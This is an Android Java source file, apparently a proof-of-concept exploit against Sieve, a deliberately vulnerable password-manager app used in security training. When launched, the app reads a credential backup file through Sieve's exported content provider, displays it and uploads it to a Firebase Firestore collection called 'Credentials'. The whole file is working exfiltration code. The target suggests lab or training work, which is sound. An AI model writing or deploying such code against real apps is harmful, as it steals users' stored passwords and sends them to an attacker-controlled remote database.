package com.example.sieveplswork;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import com.google.firebase.firestore.FirebaseFirestore;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends Activity {
    private static final String TAG = "SievePOC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        TextView resultText = findViewById(R.id.resultText);
        FirebaseFirestore db = FirebaseFirestore.getInstance();

        try {
            String fileName = "Backup (2026-03-13 20-41-03.93).xml";
            String directory = "/storage/emulated/0/Android/data/com.mwr.example.sieve/files/";
            Uri uri = Uri.parse("content://com.mwr.example.sieve.FileBackupProvider" + directory + fileName);

            InputStream is = getContentResolver().openInputStream(uri);
            String creds = new String(is.readAllBytes());
            is.close();

            resultText.setText(creds);

            Map<String, Object> data = new HashMap<>();
            data.put("XML", creds);

            db.collection("Credentials")
                    .add(data)
                    .addOnSuccessListener(aVoid -> {
                        Log.d(TAG, "Successfully written!");
                    })
                    .addOnFailureListener(e -> {
                        Log.w(TAG, "Failed: " + e.getMessage());
                    });

        } catch (Exception e) {
            resultText.setText("Error: " + e.getMessage());
        }
    }
}